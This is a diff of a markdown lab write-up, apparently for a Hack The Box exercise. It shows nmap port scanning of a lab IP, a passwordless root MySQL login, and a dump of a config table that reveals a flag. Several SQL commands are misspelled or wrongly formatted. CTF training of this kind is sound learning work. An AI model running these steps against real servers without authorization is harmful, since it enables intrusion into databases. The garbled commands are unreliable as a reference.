@@ -48,10 +48,62 @@ The top 10 classification SQL injection, A03: 2021-Injection have high risks.
 
 ### Task 2 
 ### Process of solving task 2
-1. We need to scan the target mechine and get the port information by using nmap
+1. We need to scan the target mechine (10.129.124.197) and get the port information by using nmap.
+   At first , i tried nmap to scan the target mechine and i found that it is too slow.
    ```bash
-    nmap -sV -Pn 10.129.183.140
-    ```
-2. According to the response, we can know that the service is mysql.
-4. 
+    sudo nmap -p- -Pn -sV 10.129.124.197
+   ```
+   Therefore, i added '--min-rate=1000' to increase the scanning speed.
    
+   ```bash
+    sudo nmap -p- -Pn --min-rate=1000 -sV 10.129.124.197
+    ```
+   ![scan port](./image/Task2_scan.jpg)
+   
+2. According to the response, we can know that the service is mysql. So we need to find the command of mysql.
+    ```bash
+    #'-u root' means use the username root
+    #'-h' means connect to the IP address which is 10.129.124.197
+    mysql -u root -h 10.129.124.197
+    ```
+ ![scan port](./image/Task2_mysql.jpg)
+
+The response shows that it connect to mysql server.
+
+3. When we connect to mysql server, it will not automatically get into any database.
+  
+   So we need to use SHOWDATABASE to see what's database inside.
+
+   **SHOWDATABASE** this is a tool to list all databases the current user has permission to see.
+
+   ![scan port](./image/Task2_show_database.jpg)
+
+    From this response , we can see there are 4 different databases inside. 
+
+4. **USE<database_name>** this is to use a spefic use of the database.
+
+    I tried htb so i type 
+    ```bash
+    USE<htb>
+    ```
+    and it turned into the htb database.
+
+5. **SHOWTABLE** we need to know how many tables in the database, so we use SHOWTABLE to see the tables in the database.
+    ```bash
+    SHOWTABLE
+    ```
+    ![scan port](./image/Task2_show_tables.jpg)
+
+   From the result , we can see there are 2 different tables (config and user) in htb database.
+
+6. **SELECT * FROM** This is a tool to select all the files in the tables.
+    ```bash
+    #select all the files in the config table
+    SELECT * FROM config
+    ```
+
+   ![scan port](./image/Task2_select_from.jpg)
+
+According to the result, we can find the flag:  7b4bec00d1a39e3dd4e021ec3d915da8 .
+
+-- 
